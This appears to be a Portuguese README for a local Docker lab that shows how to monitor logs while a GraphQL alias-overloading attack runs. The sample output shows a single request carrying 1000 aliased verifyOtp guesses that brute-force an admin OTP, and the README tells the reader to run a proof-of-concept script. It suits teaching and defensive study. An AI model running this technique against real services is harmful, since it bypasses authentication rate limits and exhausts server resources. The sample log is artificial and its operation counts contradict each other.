# 🔍 GraphQL DoS Lab - Com Logging Detalhado

Versão melhorada com logging completo para análise de requisições.

## 🚀 Iniciar o Lab

```bash
# Build e start
docker-compose up -d --build

# Verificar se está rodando
docker ps | grep graphql
```

## 🔍 Monitorar Requisições

### Opção 1: Script de Monitoramento (Recomendado)

```bash
./monitor.sh
```

O script oferece 6 modos de monitoramento:
1. Logs em tempo real (básico)
2. Filtro de ALIAS ATTACKS
3. Contador de operações
4. Logs de OTP apenas
5. Estatísticas do container
6. Instruções para split screen

### Opção 2: Comandos Manuais

```bash
# Ver todos os logs em tempo real
docker logs -f graphql-dos-lab

# Ver apenas ataques de alias
docker logs -f graphql-dos-lab | grep "ALIAS ATTACK"

# Ver operações executadas
docker logs -f graphql-dos-lab | grep "Operation #"

# Ver tentativas de OTP
docker logs -f graphql-dos-lab | grep "verifyOtp"

# Estatísticas de CPU/RAM
docker stats graphql-dos-lab
```

## 📊 O que você verá nos logs

### Quando executar o exploit de Alias Overloading:

```
================================================================================
[2024-01-15T10:30:45.123Z] 📥 INCOMING REQUEST
================================================================================
🌐 IP: 172.17.0.1
📍 Method: POST
🔗 URL: /graphql
📦 Content-Type: application/json
📏 Content-Length: 125438 bytes

📊 QUERY ANALYSIS:
   • Lines: 1001
   • Aliases detected: 1000
   • Query size: 125438 chars

🔥 ALIAS ATTACK DETECTED!
   • 1000 operations in 1 HTTP request
   • Amplification factor: 1000x

📝 Query Preview:
--------------------------------------------------------------------------------
query {
  v0000: verifyOtp(email: "admin@vulnerable.app", code: "0000", ...) { status }
  v0001: verifyOtp(email: "admin@vulnerable.app", code: "0001", ...) { status }
  v0002: verifyOtp(email: "admin@vulnerable.app", code: "0002", ...) { status }
... (998 more lines)
--------------------------------------------------------------------------------

   [Resolver] verifyOtp() #1
      • Email: admin@vulnerable.app
      • Code: 0000
      • Token: TestToken123
      ❌ Invalid code
   [Resolver] verifyOtp() #2
      • Email: admin@vulnerable.app
      • Code: 0001
      • Token: TestToken123
      ❌ Invalid code
   ...
   [Resolver] verifyOtp() #4242
      • Email: admin@vulnerable.app
      • Code: 4242
      • Token: TestToken123
      ✅ SUCCESS! Valid OTP found: 4242

🔥 TOTAL OPERATIONS EXECUTED: 1000

⏱️  Response Time: 52341ms
📤 Status: 200
================================================================================
```

## 🎯 Teste Prático

**Terminal 1** - Monitorar logs:
```bash
docker logs -f graphql-dos-lab
```

**Terminal 2** - Executar exploit:
```bash
python alias_overloading_poc.py 1
```

Você verá em tempo real:
- ✅ 1 request HTTP chegando
- 🔥 Detecção de 1000 aliases
- 📊 1000 operações sendo executadas
- ⏱️ Tempo total de processamento

## 📈 Monitoramento Avançado

### Ver logs anteriores (últimas 100 linhas)
```bash
docker logs --tail 100 graphql-dos-lab
```

### Salvar logs em arquivo
```bash
docker logs graphql-dos-lab > attack_logs.txt
```

### Filtrar por timestamp
```bash
docker logs --since 5m graphql-dos-lab
```

### Ver uso de recursos durante ataque
```bash
docker stats --no-stream graphql-dos-lab
```

## 🛑 Parar o Lab

```bash
docker-compose down
```

## 💡 Dicas

- Use `Ctrl+C` para sair do modo de logs em tempo real
- O container gera MUITO log durante ataques - isso é intencional
- Logs mostram cada operação individual para fins educacionais
- CPU/RAM spikes são esperados durante ataques massivos
